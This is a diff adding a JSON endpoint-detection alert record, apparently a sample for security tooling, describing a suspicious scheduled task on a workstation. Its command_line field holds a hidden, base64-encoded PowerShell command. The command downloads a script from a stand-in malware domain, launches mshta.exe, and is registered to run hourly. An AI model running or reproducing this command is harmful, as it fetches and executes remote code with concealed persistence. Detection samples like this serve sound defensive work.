@@ -1,0 +1,27 @@
+{
+  "alert_id": "ALERT-2025-004-SUSP",
+  "source": "edr-agent",
+  "timestamp": "2025-06-11T09:15:00Z",
+  "event_type": "process_creation",
+  "hostname": "WORKSTATION-USER-05",
+  "process_name": "schtasks.exe",
+  "command_line": "schtasks.exe /create /tn \"UpdaterTask\" /tr \"C:\\Windows\\System32\\cmd.exe /c powershell.exe -W Hidden -Enc JABsAG8AYQBkAGUAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AZABvAHcAbgBsAG8AYQBkAC4AeAB5AHoALwBzAGUAdAB1AHAAcAAuAHAAcwAxACcAKQA7ACAAaQBmACAAKABHAEUAVAAgAC0ASQB0AGUAbQAgAC0AUABBAFQASAAgAFAAVABIADoAOgBQAGEAdABoACAALQBGAEkAbABlACAALQBOAGEAbQBlACAAbQBzAGgAdABhAC4AZQB4AGUAKQAgAHsAIABzAHQAYQByAHQALQBwAHIAbwBjAGUAcwBzACAAbQBzAGgAdABhAC4AZQB4AGUAIAB9ACIA /sc hourly /mo 1 /f\"",
+  "parent_process": "C:\\Windows\\System32\\cmd.exe",
+  "indicators": {
+    "hashes": [
+      "e99a18c428cb38d5f260853678922e03"
+    ],
+    "ips": [
+      "91.121.87.54",
+      "185.130.5.251"
+    ],
+    "domains": [
+      "malware.download.xyz"
+    ],
+    "file_paths": [
+      "C:\\Users\\victim\\AppData\\Local\\Temp\\setup.ps1"
+    ]
+  },
+  "parent_pid": 5012,
+  "pid": 5210
+}
